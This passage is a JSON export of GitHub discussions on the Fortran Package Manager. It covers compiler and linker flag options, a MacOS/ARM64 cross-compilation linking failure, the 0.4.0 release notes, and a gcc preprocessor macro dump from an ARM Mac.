                    "text": "One option would be to allow specification entirely over the command\nline, without any environment variable usage\n\n    fpm install --flag \"$FFLAGS\" --c-flag \"$CFLAGS\" \\\n      --link-flag \"$LDFLAGS\" --compiler \"$FC\" --c-compiler \"$CC\" \\\n      --archiver \"$AR\"\n\nThis might become a bit unwieldy in practice. But I don't see how we\ncan make this setup automatic in fpm, i.e. I don't think there is a way\nto know whether the C compiler should be clang or gcc together with\ngfortran.\n\nAnother option would be to make it opt-in to use environment variables:\n\n    fpm config toolchain.use-env=true\n\nwhich could be saved in `~/.config/fpm/config.toml` or similar and maps\nto\n\n    [toolchain]\n    use-env = true\n\nRegarding changes in environment variables, changing the Fortran\ncompiler will trigger a rebuild. We currently don't track which\ncompiler is used for C, therefore changing FPM_C_COMPILER doesn't\ntrigger rebuilds right now (this can be considered a bug). A possible\nfix would be to create a hash from our entire toolchain, instead of\njust using the basename of the Fortran compiler and the hash of the\nFortran flags."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-08-30 11:42:57+00:00",
                    "text": "I would have suggested that we support the standard environment variables (FFLAGS, CFLAGS, LDFLAGS, etc.), with FPM_* counterparts taking precedence, as a way of making things feel more natural to new users, but @urbanjost list makes me think that won't necessarily help, since that list doesn't even have FFLAGS or CFLAGS.\nI've never been much of a fan of environment variables (hidden global state that affects the behavior of various commands), so I do think any options should be specifiable via the command line. I'm ok with having environment variables for those who like them. I'm not sure how much value putting these kinds of options into a global config file would have. I would think they would be more project specific than that.\nI did notice that this PR adds the --c-flag and --ld-flag options. (At least I think it does). If you also add --c-compiler and --archiver (I'm not attached to that last name) options, I think I'd be in favor of this."
                },
                {
                    "user": "certik",
                    "date": "2021-08-30 15:21:39+00:00",
                    "text": "@awvwgk, would you be against only supporting the FPM_* variables by default, but adding an option --use-env-variables (perhaps better named) that would allow to use the FC / FFLAGS and other variables optionally?\nThen we can merge this PR, move on, you get what you want (almost, just adding one single option), I get what I want, and we can use it and see if we want to make the --use-env-variables the default. And if we decide to do --use-env-variables by default, that's a super simple PR that we can submit anytime.\nThe issue with making --use-env-variables the default right away is that if we later decide that it was a mistake and want to take it away, it will break people's builds. And that is mainly the experience that I want to avoid. I am not against adding optional features to test things out, and if they don't work out, we can deprecate and remove, without really breaking people's builds."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-30 17:17:42+00:00",
                    "text": "There is an issue with the order of evaluation when using a option like\n--use-env-variables, which would require some more restructuring of the\ncode.\n\nRight now we are using that we can provide defaults to M_CLI2 and\npopulate those from the environment variables. This way the values are\ncorrectly overwritten when the option is provided by the user. In this\nsetup we would only know after the fact that we are allowed to use the\nenvironment variables as default.\n\nBrad's suggestion was easy to try out, therefore I went ahead and\nimplemented it. For a command line switch I need a bit more time to get\nthe implementation done properly. I'm at a conference the whole week,\ntherefore I won't get my head free to work concentrated on a bigger\ncoding project, but I'll pick it up for sure once I'm back.\n\nAlso, my preference for this would actually be a global configuration\nfile where every user can opt-in once. This saves the work of rewriting\nthe logic in the CLI as well. And I kind of like the way the hierachy\nbetween command line and environment variables just works naturally\nwith M_CLI2 right now.\n\nMy suggestion to move forward would be:\n\n1. I remove the non-prefixed environment variables from this patch\n2. We discuss and review this patch\n3. I implement a global setting file and a git-config like CLI\n4. We add the non-prefixed environment variables as opt-in\n   (maybe even allow to opt-out of environment variables alltogether)\n\nI guess we should organize a call for next week with at least everybody\nparticipating in this thread to discuss further, by then I will have\nthe implementations ready for comparison."
                },
                {
                    "user": "certik",
                    "date": "2021-08-30 17:50:18+00:00",
                    "text": "@awvwgk your plan works with me. A global settings file I think is fine. It's not there by default, but you can put it there and enable the non-prefixed environment variables to work."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-04 16:48:12+00:00",
                    "text": "@certik @milancurcic would you like to organize a call to discuss this topic?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-22 15:40:23+00:00",
                    "text": "As discussed today, this PR will be limited to filling in the missing options for customizing the linker and C compiler flags as well as selecting a custom archiver. It also proposes environment variables for all those options which are prefixed with FPM_, we can remove those environment variables if they should be discussed separately.\nI want to keep this PR lean and focus on this single feature, once we agree on it I will build the other points we discussed here on top and open a separate PR."
                },
                {
                    "user": "certik",
                    "date": "2021-09-22 18:29:50+00:00",
                    "text": "Related to this PR, I want to point attention to this issue: conda-forge/fpm-feedstock#7\nI strongly suspect the reason the fpm on Apple M1 segfaults is because we do not follow the Conda's special flags (https://github.com/conda-forge/fpm-feedstock/blob/efd5174e1f87e12f99f0b3b7e24dc0784ea7f125/recipe/build.sh#L4). It is cross-compiled on an Intel macOS, so we have to follow the exact flags, otherwise it gets miscompiled."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-22 19:05:48+00:00",
                    "text": "Yes, this issue might indeed be related to the fact that we currently have no way to pass C flags to the compiler. Maybe this patch is able to fix the cross-compiled MacOS/Arm64 binary on conda-forge.\n@certik Since you have a Mac, could you give this a try? I think you can run the MacOS/Arm64 cross-compiler with rosetta on your machine and directly verify the result. Not sure how easy it is to reproduce the conda-build setup this way, but most of the environment setup should be in the build log. If not we have to wait for the next release to see whether this was the cause."
                },
                {
                    "user": "certik",
                    "date": "2021-09-23 00:11:46+00:00",
                    "text": "The easiest way to try the patch is to start a PR at the fpm-feedstock (and just not merge it). It's quite hard to reproduce the build locally."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-23 19:42:03+00:00",
                    "text": "Thanks for reviewing. I'll go ahead and merge this patch."
                }
            ]
        },
        {
            "number": 548,
            "user": "brocolis",
            "date": "2021-08-27 03:48:13+00:00",
            "title": "Build on MacOS/ARM64",
            "text": "None",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-08-27 06:17:01+00:00",
                    "text": "Testing this in https://dev.azure.com/conda-forge/feedstock-builds/_build/results?buildId=368527&view=logs&j=ced5d8de-8227-5f3f-33a1-45cf1592c45a."
                }
            ]
        },
        {
            "number": 547,
            "user": "awvwgk",
            "date": "2021-08-26 22:32:48+00:00",
            "title": "Compilation fails for MacOS/ARM64",
            "text": "This linking error occurs when cross-compiling a MacOS/ARM64 version of fpm from MacOS/x86_64.\n + $BUILD_PREFIX/bin/arm64-apple-darwin20.0.0-gfortran  -Wl,-pie -Wl,-headerpad_max_install_names -Wl,-dead_strip_dylibs -Wl,-rpath,$PREFIX/lib -L$PREFIX/lib -march=armv8.3-a -ftree-vectorize -fPIC -fno-stack-protector -O2 -pipe -isystem $PREFIX/include -fdebug-prefix-map=$SRC_DIR=/usr/local/src/conda/fpm-0.4.0 -fdebug-prefix-map=$PREFIX=/usr/local/src/conda-prefix -J build/arm64-apple-darwin20.0.0-gfortran_4605AD8986954164/fpm -I build/arm64-apple-darwin20.0.0-gfortran_4605AD8986954164/fpm  build/arm64-apple-darwin20.0.0-gfortran_4605AD8986954164/fpm/app_main.f90.o build/arm64-apple-darwin20.0.0-gfortran_4605AD8986954164/fpm/libfpm.a -o build/arm64-apple-darwin20.0.0-gfortran_4605AD8986954164/app/fpm\nUndefined symbols for architecture arm64:\n  \"_opendir$INODE64\", referenced from:\n      _c_opendir in libfpm.a(src_filesystem_utilities.c.o)\n  \"_readdir$INODE64\", referenced from:\n      _c_readdir in libfpm.a(src_filesystem_utilities.c.o)\nld: symbol(s) not found for architecture arm64\ncollect2: error: ld returned 1 exit status\nSTOP 1\n <ERROR> Compilation failed for object \"fpm\"\n\nIt is save to assume that the current git source won't compile on native MacOS/ARM64 at the moment as well.\nThe additional suffix required for opendir is probably not required on MacOS/ARM64, which means we have to add another preprocessor branch for this. First, we have to identify which macro is set on MacOS/ARM64 and can be used to identify the architecture (see https://sourceforge.net/p/predef/wiki/Architectures/ for a list of architecture macros).",
            "comments": []
        },
        {
            "number": 546,
            "user": "awvwgk",
            "date": "2021-08-26 18:18:46+00:00",
            "title": "Update version for release 0.4.0",
            "text": "Release is tested here: https://github.com/awvwgk/fortran-package-manager/releases/tag/v0.4.0\n\nRelease notes:\nChanges\n\nbootstrap script is now based on 0.3.0 (#504)\nexecutable, example and test names are checked to contain only alphanumeric characters (#511)\noptimize file listing (#507)\n\nNew Features\n\ngenerate build/.gitignore to avoid disallow committing build artifacts (#528)\nallow extra section in package manifest (#533)\nsupport MPI wrappers and LFortran compiler (#527)\n\nFixes\n\ninitialize executable names before comparison (#516)\ndon't access unallocated variables in fpm-run (#517)\ncleanup help texts and remove unallocated variables (#522)\nfix compilation errors for building fpm with ifort (#523)\nalways call git init in case of backfilling with fpm-new (#536)\nuse correct symbols on MacOS/ARM64 (#548)\n\n\nFor conda-forge we have to rewrite the build script first, because the bootstrapping process can no longer be done in a single step but requires a two-stage procedure now. I have an idea how to do this smoothly even when cross-compiling, but I haven't tried it yet.\nFor LFortran's CI you have to download the Windows binary from the GitHub release because we still can't fpm build with conda-forge's toolchain on Windows. For MacOS and Linux conda-forge of course should work just fine.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-08-26 18:23:47+00:00",
                    "text": "Wow, so many new features and fixes :). Well deserved for a new release, great work fpm team!"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-26 19:44:48+00:00",
                    "text": "I'm currently checking whether we can build smoothly on conda-forge in conda-forge/fpm-feedstock#6. So far everything looks good."
                },
                {
                    "user": "certik",
                    "date": "2021-08-26 20:03:40+00:00",
                    "text": "@awvwgk thanks for this. If you write what tasks need to be done, I can help."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-26 20:07:30+00:00",
                    "text": "Got a failure for cross-compiling on OSX/x86_64 for OSX/aarch64:\n + $BUILD_PREFIX/bin/arm64-apple-darwin20.0.0-gfortran  -Wl,-pie -Wl,-headerpad_max_install_names -Wl,-dead_strip_dylibs -Wl,-rpath,$PREFIX/lib -L$PREFIX/lib -march=armv8.3-a -ftree-vectorize -fPIC -fno-stack-protector -O2 -pipe -isystem $PREFIX/include -fdebug-prefix-map=$SRC_DIR=/usr/local/src/conda/fpm-0.4.0 -fdebug-prefix-map=$PREFIX=/usr/local/src/conda-prefix -J build/arm64-apple-darwin20.0.0-gfortran_4605AD8986954164/fpm -I build/arm64-apple-darwin20.0.0-gfortran_4605AD8986954164/fpm  build/arm64-apple-darwin20.0.0-gfortran_4605AD8986954164/fpm/app_main.f90.o build/arm64-apple-darwin20.0.0-gfortran_4605AD8986954164/fpm/libfpm.a -o build/arm64-apple-darwin20.0.0-gfortran_4605AD8986954164/app/fpm\nUndefined symbols for architecture arm64:\n  \"_opendir$INODE64\", referenced from:\n      _c_opendir in libfpm.a(src_filesystem_utilities.c.o)\n  \"_readdir$INODE64\", referenced from:\n      _c_readdir in libfpm.a(src_filesystem_utilities.c.o)\nld: symbol(s) not found for architecture arm64\ncollect2: error: ld returned 1 exit status\nSTOP 1\n <ERROR> Compilation failed for object \"fpm\""
                },
                {
                    "user": "LKedward",
                    "date": "2021-08-26 21:30:45+00:00",
                    "text": "I'm not able to test this directly but I think those functions just have the normal symbol names on Darwin arm64, i.e. they don't need the strange mangling that we're currently doing on osx. So I reckon we just need to update the preprocessor logic there."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-26 21:41:56+00:00",
                    "text": "@certik Since you have access to OSX/aarch64, could you give me a preprocessor dump from gcc -dM -E -x c /dev/null from your machine. I have one for OSX/x86_64 already which we can use for comparison:\nhttps://gist.github.com/awvwgk/b8276c3f2dfbf7cd7ef710fcdc92e6cd#file-macos-gcc-txt"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-27 08:28:10+00:00",
                    "text": "Thanks everybody, especially Carlos @brocolis for the quick for the MacOS/ARM build. I'll go ahead and merge now."
                },
                {
                    "user": "certik",
                    "date": "2021-08-27 17:25:39+00:00",
                    "text": "Sorry for my late response:\n$ gcc -dM -E -x c /dev/null\n#define _LP64 1\n#define __AARCH64EL__ 1\n#define __AARCH64_CMODEL_SMALL__ 1\n#define __AARCH64_SIMD__ 1\n#define __APPLE_CC__ 6000\n#define __APPLE__ 1\n#define __ARM64_ARCH_8__ 1\n#define __ARM_64BIT_STATE 1\n#define __ARM_ACLE 200\n#define __ARM_ALIGN_MAX_STACK_PWR 4\n#define __ARM_ARCH 8\n#define __ARM_ARCH_8_3__ 1\n#define __ARM_ARCH_ISA_A64 1\n#define __ARM_ARCH_PROFILE 'A'\n#define __ARM_FEATURE_CLZ 1\n#define __ARM_FEATURE_COMPLEX 1\n#define __ARM_FEATURE_CRC32 1\n#define __ARM_FEATURE_CRYPTO 1\n#define __ARM_FEATURE_DIRECTED_ROUNDING 1\n#define __ARM_FEATURE_DIV 1\n#define __ARM_FEATURE_FMA 1\n#define __ARM_FEATURE_FP16_SCALAR_ARITHMETIC 1\n#define __ARM_FEATURE_FP16_VECTOR_ARITHMETIC 1\n#define __ARM_FEATURE_IDIV 1\n#define __ARM_FEATURE_JCVT 1\n#define __ARM_FEATURE_LDREX 0xF\n#define __ARM_FEATURE_NUMERIC_MAXMIN 1\n#define __ARM_FEATURE_QRDMX 1\n#define __ARM_FEATURE_UNALIGNED 1\n#define __ARM_FP 0xE\n#define __ARM_FP16_ARGS 1\n#define __ARM_FP16_FORMAT_IEEE 1\n#define __ARM_NEON 1\n#define __ARM_NEON_FP 0xE\n#define __ARM_NEON__ 1\n#define __ARM_PCS_AAPCS64 1\n#define __ARM_SIZEOF_MINIMAL_ENUM 4\n#define __ARM_SIZEOF_WCHAR_T 4\n#define __ATOMIC_ACQUIRE 2\n#define __ATOMIC_ACQ_REL 4\n#define __ATOMIC_CONSUME 1\n#define __ATOMIC_RELAXED 0\n#define __ATOMIC_RELEASE 3\n#define __ATOMIC_SEQ_CST 5\n#define __BIGGEST_ALIGNMENT__ 8\n#define __BLOCKS__ 1\n#define __BYTE_ORDER__ __ORDER_LITTLE_ENDIAN__\n#define __CHAR16_TYPE__ unsigned short\n#define __CHAR32_TYPE__ unsigned int\n#define __CHAR_BIT__ 8\n#define __CLANG_ATOMIC_BOOL_LOCK_FREE 2\n#define __CLANG_ATOMIC_CHAR16_T_LOCK_FREE 2\n#define __CLANG_ATOMIC_CHAR32_T_LOCK_FREE 2\n#define __CLANG_ATOMIC_CHAR_LOCK_FREE 2\n#define __CLANG_ATOMIC_INT_LOCK_FREE 2\n#define __CLANG_ATOMIC_LLONG_LOCK_FREE 2\n#define __CLANG_ATOMIC_LONG_LOCK_FREE 2\n#define __CLANG_ATOMIC_POINTER_LOCK_FREE 2\n#define __CLANG_ATOMIC_SHORT_LOCK_FREE 2\n#define __CLANG_ATOMIC_WCHAR_T_LOCK_FREE 2\n#define __CONSTANT_CFSTRINGS__ 1\n#define __DBL_DECIMAL_DIG__ 17\n#define __DBL_DENORM_MIN__ 4.9406564584124654e-324\n#define __DBL_DIG__ 15\n#define __DBL_EPSILON__ 2.2204460492503131e-16\n#define __DBL_HAS_DENORM__ 1\n#define __DBL_HAS_INFINITY__ 1\n#define __DBL_HAS_QUIET_NAN__ 1\n#define __DBL_MANT_DIG__ 53\n#define __DBL_MAX_10_EXP__ 308\n#define __DBL_MAX_EXP__ 1024\n#define __DBL_MAX__ 1.7976931348623157e+308\n#define __DBL_MIN_10_EXP__ (-307)\n#define __DBL_MIN_EXP__ (-1021)\n#define __DBL_MIN__ 2.2250738585072014e-308\n#define __DECIMAL_DIG__ __LDBL_DECIMAL_DIG__\n#define __DYNAMIC__ 1\n#define __ENVIRONMENT_MAC_OS_X_VERSION_MIN_REQUIRED__ 110000\n#define __ENVIRONMENT_OS_VERSION_MIN_REQUIRED__ 110000\n#define __FINITE_MATH_ONLY__ 0\n#define __FLT16_DECIMAL_DIG__ 5\n#define __FLT16_DENORM_MIN__ 5.9604644775390625e-8F16\n#define __FLT16_DIG__ 3\n#define __FLT16_EPSILON__ 9.765625e-4F16\n#define __FLT16_HAS_DENORM__ 1\n#define __FLT16_HAS_INFINITY__ 1\n#define __FLT16_HAS_QUIET_NAN__ 1\n#define __FLT16_MANT_DIG__ 11\n#define __FLT16_MAX_10_EXP__ 4\n#define __FLT16_MAX_EXP__ 16\n#define __FLT16_MAX__ 6.5504e+4F16\n#define __FLT16_MIN_10_EXP__ (-4)\n#define __FLT16_MIN_EXP__ (-13)\n#define __FLT16_MIN__ 6.103515625e-5F16\n#define __FLT_DECIMAL_DIG__ 9\n#define __FLT_DENORM_MIN__ 1.40129846e-45F\n#define __FLT_DIG__ 6\n#define __FLT_EPSILON__ 1.19209290e-7F\n#define __FLT_EVAL_METHOD__ 0\n#define __FLT_HAS_DENORM__ 1\n#define __FLT_HAS_INFINITY__ 1\n#define __FLT_HAS_QUIET_NAN__ 1\n#define __FLT_MANT_DIG__ 24\n#define __FLT_MAX_10_EXP__ 38\n#define __FLT_MAX_EXP__ 128\n#define __FLT_MAX__ 3.40282347e+38F\n#define __FLT_MIN_10_EXP__ (-37)\n#define __FLT_MIN_EXP__ (-125)\n#define __FLT_MIN__ 1.17549435e-38F\n#define __FLT_RADIX__ 2\n#define __GCC_ATOMIC_BOOL_LOCK_FREE 2\n#define __GCC_ATOMIC_CHAR16_T_LOCK_FREE 2\n#define __GCC_ATOMIC_CHAR32_T_LOCK_FREE 2\n#define __GCC_ATOMIC_CHAR_LOCK_FREE 2\n#define __GCC_ATOMIC_INT_LOCK_FREE 2\n#define __GCC_ATOMIC_LLONG_LOCK_FREE 2\n#define __GCC_ATOMIC_LONG_LOCK_FREE 2\n#define __GCC_ATOMIC_POINTER_LOCK_FREE 2\n#define __GCC_ATOMIC_SHORT_LOCK_FREE 2\n#define __GCC_ATOMIC_TEST_AND_SET_TRUEVAL 1\n#define __GCC_ATOMIC_WCHAR_T_LOCK_FREE 2\n#define __GCC_HAVE_SYNC_COMPARE_AND_SWAP_1 1\n#define __GCC_HAVE_SYNC_COMPARE_AND_SWAP_2 1\n#define __GCC_HAVE_SYNC_COMPARE_AND_SWAP_4 1\n#define __GCC_HAVE_SYNC_COMPARE_AND_SWAP_8 1\n#define __GNUC_MINOR__ 2\n#define __GNUC_PATCHLEVEL__ 1\n#define __GNUC_STDC_INLINE__ 1\n#define __GNUC__ 4\n#define __GXX_ABI_VERSION 1002\n#define __INT16_C_SUFFIX__ \n#define __INT16_FMTd__ \"hd\"\n#define __INT16_FMTi__ \"hi\"\n#define __INT16_MAX__ 32767\n#define __INT16_TYPE__ short\n#define __INT32_C_SUFFIX__ \n#define __INT32_FMTd__ \"d\"\n#define __INT32_FMTi__ \"i\"\n#define __INT32_MAX__ 2147483647\n#define __INT32_TYPE__ int\n#define __INT64_C_SUFFIX__ LL\n#define __INT64_FMTd__ \"lld\"\n#define __INT64_FMTi__ \"lli\"\n#define __INT64_MAX__ 9223372036854775807LL\n#define __INT64_TYPE__ long long int\n#define __INT8_C_SUFFIX__ \n#define __INT8_FMTd__ \"hhd\"\n#define __INT8_FMTi__ \"hhi\"\n#define __INT8_MAX__ 127\n#define __INT8_TYPE__ signed char\n#define __INTMAX_C_SUFFIX__ L\n#define __INTMAX_FMTd__ \"ld\"\n#define __INTMAX_FMTi__ \"li\"\n#define __INTMAX_MAX__ 9223372036854775807L\n#define __INTMAX_TYPE__ long int\n#define __INTMAX_WIDTH__ 64\n#define __INTPTR_FMTd__ \"ld\"\n#define __INTPTR_FMTi__ \"li\"\n#define __INTPTR_MAX__ 9223372036854775807L\n#define __INTPTR_TYPE__ long int\n#define __INTPTR_WIDTH__ 64\n#define __INT_FAST16_FMTd__ \"hd\"\n#define __INT_FAST16_FMTi__ \"hi\"\n#define __INT_FAST16_MAX__ 32767\n#define __INT_FAST16_TYPE__ short\n#define __INT_FAST32_FMTd__ \"d\"\n#define __INT_FAST32_FMTi__ \"i\"\n#define __INT_FAST32_MAX__ 2147483647\n#define __INT_FAST32_TYPE__ int\n#define __INT_FAST64_FMTd__ \"lld\"\n#define __INT_FAST64_FMTi__ \"lli\"\n#define __INT_FAST64_MAX__ 9223372036854775807LL\n#define __INT_FAST64_TYPE__ long long int\n#define __INT_FAST8_FMTd__ \"hhd\"\n#define __INT_FAST8_FMTi__ \"hhi\"\n#define __INT_FAST8_MAX__ 127\n#define __INT_FAST8_TYPE__ signed char\n#define __INT_LEAST16_FMTd__ \"hd\"\n#define __INT_LEAST16_FMTi__ \"hi\"\n#define __INT_LEAST16_MAX__ 32767\n#define __INT_LEAST16_TYPE__ short\n#define __INT_LEAST32_FMTd__ \"d\"\n#define __INT_LEAST32_FMTi__ \"i\"\n#define __INT_LEAST32_MAX__ 2147483647\n#define __INT_LEAST32_TYPE__ int\n#define __INT_LEAST64_FMTd__ \"lld\"\n#define __INT_LEAST64_FMTi__ \"lli\"\n#define __INT_LEAST64_MAX__ 9223372036854775807LL\n#define __INT_LEAST64_TYPE__ long long int\n#define __INT_LEAST8_FMTd__ \"hhd\"\n#define __INT_LEAST8_FMTi__ \"hhi\"\n#define __INT_LEAST8_MAX__ 127\n#define __INT_LEAST8_TYPE__ signed char\n#define __INT_MAX__ 2147483647\n#define __LDBL_DECIMAL_DIG__ 17\n#define __LDBL_DENORM_MIN__ 4.9406564584124654e-324L\n#define __LDBL_DIG__ 15\n#define __LDBL_EPSILON__ 2.2204460492503131e-16L\n#define __LDBL_HAS_DENORM__ 1\n#define __LDBL_HAS_INFINITY__ 1\n#define __LDBL_HAS_QUIET_NAN__ 1\n#define __LDBL_MANT_DIG__ 53\n#define __LDBL_MAX_10_EXP__ 308\n#define __LDBL_MAX_EXP__ 1024\n#define __LDBL_MAX__ 1.7976931348623157e+308L\n#define __LDBL_MIN_10_EXP__ (-307)\n#define __LDBL_MIN_EXP__ (-1021)\n#define __LDBL_MIN__ 2.2250738585072014e-308L\n#define __LITTLE_ENDIAN__ 1\n#define __LONG_LONG_MAX__ 9223372036854775807LL\n#define __LONG_MAX__ 9223372036854775807L\n#define __LP64__ 1\n#define __MACH__ 1\n#define __NO_INLINE__ 1\n#define __OBJC_BOOL_IS_BOOL 1\n#define __OPENCL_MEMORY_SCOPE_ALL_SVM_DEVICES 3\n#define __OPENCL_MEMORY_SCOPE_DEVICE 2\n#define __OPENCL_MEMORY_SCOPE_SUB_GROUP 4\n#define __OPENCL_MEMORY_SCOPE_WORK_GROUP 1\n#define __OPENCL_MEMORY_SCOPE_WORK_ITEM 0\n#define __ORDER_BIG_ENDIAN__ 4321\n#define __ORDER_LITTLE_ENDIAN__ 1234\n#define __ORDER_PDP_ENDIAN__ 3412\n#define __PIC__ 2\n#define __POINTER_WIDTH__ 64\n#define __PRAGMA_REDEFINE_EXTNAME 1\n#define __PTRDIFF_FMTd__ \"ld\"\n#define __PTRDIFF_FMTi__ \"li\"\n#define __PTRDIFF_MAX__ 9223372036854775807L\n#define __PTRDIFF_TYPE__ long int\n#define __PTRDIFF_WIDTH__ 64\n#define __REGISTER_PREFIX__ \n#define __SCHAR_MAX__ 127\n#define __SHRT_MAX__ 32767\n#define __SIG_ATOMIC_MAX__ 2147483647\n#define __SIG_ATOMIC_WIDTH__ 32\n#define __SIZEOF_DOUBLE__ 8\n#define __SIZEOF_FLOAT__ 4\n#define __SIZEOF_INT128__ 16\n#define __SIZEOF_INT__ 4\n#define __SIZEOF_LONG_DOUBLE__ 8\n#define __SIZEOF_LONG_LONG__ 8\n#define __SIZEOF_LONG__ 8\n#define __SIZEOF_POINTER__ 8\n#define __SIZEOF_PTRDIFF_T__ 8\n#define __SIZEOF_SHORT__ 2\n#define __SIZEOF_SIZE_T__ 8\n#define __SIZEOF_WCHAR_T__ 4\n#define __SIZEOF_WINT_T__ 4\n#define __SIZE_FMTX__ \"lX\"\n#define __SIZE_FMTo__ \"lo\"\n#define __SIZE_FMTu__ \"lu\"\n#define __SIZE_FMTx__ \"lx\"\n#define __SIZE_MAX__ 18446744073709551615UL\n#define __SIZE_TYPE__ long unsigned int\n#define __SIZE_WIDTH__ 64\n#define __SSP__ 1\n#define __STDC_HOSTED__ 1\n#define __STDC_NO_THREADS__ 1\n#define __STDC_UTF_16__ 1\n#define __STDC_UTF_32__ 1\n#define __STDC_VERSION__ 201710L\n#define __STDC__ 1\n#define __UINT16_C_SUFFIX__ \n#define __UINT16_FMTX__ \"hX\"\n#define __UINT16_FMTo__ \"ho\"\n#define __UINT16_FMTu__ \"hu\"\n#define __UINT16_FMTx__ \"hx\"\n#define __UINT16_MAX__ 65535\n#define __UINT16_TYPE__ unsigned short\n#define __UINT32_C_SUFFIX__ U\n#define __UINT32_FMTX__ \"X\"\n#define __UINT32_FMTo__ \"o\"\n#define __UINT32_FMTu__ \"u\"\n#define __UINT32_FMTx__ \"x\"\n#define __UINT32_MAX__ 4294967295U\n#define __UINT32_TYPE__ unsigned int\n#define __UINT64_C_SUFFIX__ ULL\n#define __UINT64_FMTX__ \"llX\"\n#define __UINT64_FMTo__ \"llo\"\n#define __UINT64_FMTu__ \"llu\"\n#define __UINT64_FMTx__ \"llx\"\n#define __UINT64_MAX__ 18446744073709551615ULL\n#define __UINT64_TYPE__ long long unsigned int\n#define __UINT8_C_SUFFIX__ \n#define __UINT8_FMTX__ \"hhX\"\n#define __UINT8_FMTo__ \"hho\"\n#define __UINT8_FMTu__ \"hhu\"\n#define __UINT8_FMTx__ \"hhx\"\n#define __UINT8_MAX__ 255\n#define __UINT8_TYPE__ unsigned char\n#define __UINTMAX_C_SUFFIX__ UL\n#define __UINTMAX_FMTX__ \"lX\"\n#define __UINTMAX_FMTo__ \"lo\"\n#define __UINTMAX_FMTu__ \"lu\"\n#define __UINTMAX_FMTx__ \"lx\"\n#define __UINTMAX_MAX__ 18446744073709551615UL\n#define __UINTMAX_TYPE__ long unsigned int\n#define __UINTMAX_WIDTH__ 64\n#define __UINTPTR_FMTX__ \"lX\"\n#define __UINTPTR_FMTo__ \"lo\"\n#define __UINTPTR_FMTu__ \"lu\"\n#define __UINTPTR_FMTx__ \"lx\"\n#define __UINTPTR_MAX__ 18446744073709551615UL\n#define __UINTPTR_TYPE__ long unsigned int\n#define __UINTPTR_WIDTH__ 64\n#define __UINT_FAST16_FMTX__ \"hX\"\n#define __UINT_FAST16_FMTo__ \"ho\"\n#define __UINT_FAST16_FMTu__ \"hu\"\n#define __UINT_FAST16_FMTx__ \"hx\"\n#define __UINT_FAST16_MAX__ 65535\n#define __UINT_FAST16_TYPE__ unsigned short\n#define __UINT_FAST32_FMTX__ \"X\"\n#define __UINT_FAST32_FMTo__ \"o\"\n#define __UINT_FAST32_FMTu__ \"u\"\n#define __UINT_FAST32_FMTx__ \"x\"\n#define __UINT_FAST32_MAX__ 4294967295U\n#define __UINT_FAST32_TYPE__ unsigned int\n#define __UINT_FAST64_FMTX__ \"llX\"\n#define __UINT_FAST64_FMTo__ \"llo\"\n#define __UINT_FAST64_FMTu__ \"llu\"\n#define __UINT_FAST64_FMTx__ \"llx\"\n#define __UINT_FAST64_MAX__ 18446744073709551615ULL\n#define __UINT_FAST64_TYPE__ long long unsigned int\n#define __UINT_FAST8_FMTX__ \"hhX\"\n#define __UINT_FAST8_FMTo__ \"hho\"\n#define __UINT_FAST8_FMTu__ \"hhu\"\n#define __UINT_FAST8_FMTx__ \"hhx\"\n#define __UINT_FAST8_MAX__ 255\n#define __UINT_FAST8_TYPE__ unsigned char\n#define __UINT_LEAST16_FMTX__ \"hX\"\n#define __UINT_LEAST16_FMTo__ \"ho\"\n#define __UINT_LEAST16_FMTu__ \"hu\"\n#define __UINT_LEAST16_FMTx__ \"hx\"\n#define __UINT_LEAST16_MAX__ 65535\n#define __UINT_LEAST16_TYPE__ unsigned short\n#define __UINT_LEAST32_FMTX__ \"X\"\n#define __UINT_LEAST32_FMTo__ \"o\"\n#define __UINT_LEAST32_FMTu__ \"u\"\n#define __UINT_LEAST32_FMTx__ \"x\"\n#define __UINT_LEAST32_MAX__ 4294967295U\n#define __UINT_LEAST32_TYPE__ unsigned int\n#define __UINT_LEAST64_FMTX__ \"llX\"\n#define __UINT_LEAST64_FMTo__ \"llo\"\n#define __UINT_LEAST64_FMTu__ \"llu\"\n#define __UINT_LEAST64_FMTx__ \"llx\"\n#define __UINT_LEAST64_MAX__ 18446744073709551615ULL\n#define __UINT_LEAST64_TYPE__ long long unsigned int\n#define __UINT_LEAST8_FMTX__ \"hhX\"\n#define __UINT_LEAST8_FMTo__ \"hho\"\n#define __UINT_LEAST8_FMTu__ \"hhu\"\n#define __UINT_LEAST8_FMTx__ \"hhx\"\n#define __UINT_LEAST8_MAX__ 255\n#define __UINT_LEAST8_TYPE__ unsigned char\n#define __USER_LABEL_PREFIX__ _\n#define __VERSION__ \"Apple LLVM 12.0.5 (clang-1205.0.22.11)\"\n#define __WCHAR_MAX__ 2147483647\n#define __WCHAR_TYPE__ int\n#define __WCHAR_WIDTH__ 32\n#define __WINT_MAX__ 2147483647\n#define __WINT_TYPE__ int\n#define __WINT_WIDTH__ 32\n#define __aarch64__ 1\n#define __apple_build_version__ 12050022\n#define __arm64 1\n#define __arm64__ 1\n#define __block __attribute__((__blocks__(byref)))\n#define __clang__ 1\n#define __clang_major__ 12\n#define __clang_minor__ 0\n#define __clang_patchlevel__ 5\n#define __clang_version__ \"12.0.5 (clang-1205.0.22.11)\"\n#define __llvm__ 1\n#define __nonnull _Nonnull\n#define __null_unspecified _Null_unspecified\n#define __nullable _Nullable\n#define __pic__ 2\n#define __strong \n#define __unsafe_unretained \n#define __weak __attribute__((objc_gc(weak)))"
                }
            ]
        },
        {
            "number": 545,
            "user": "urbanjost",
            "date": "2021-08-26 00:35:05+00:00",
            "title": "Is LFortran supposed to be a supported compiler?",
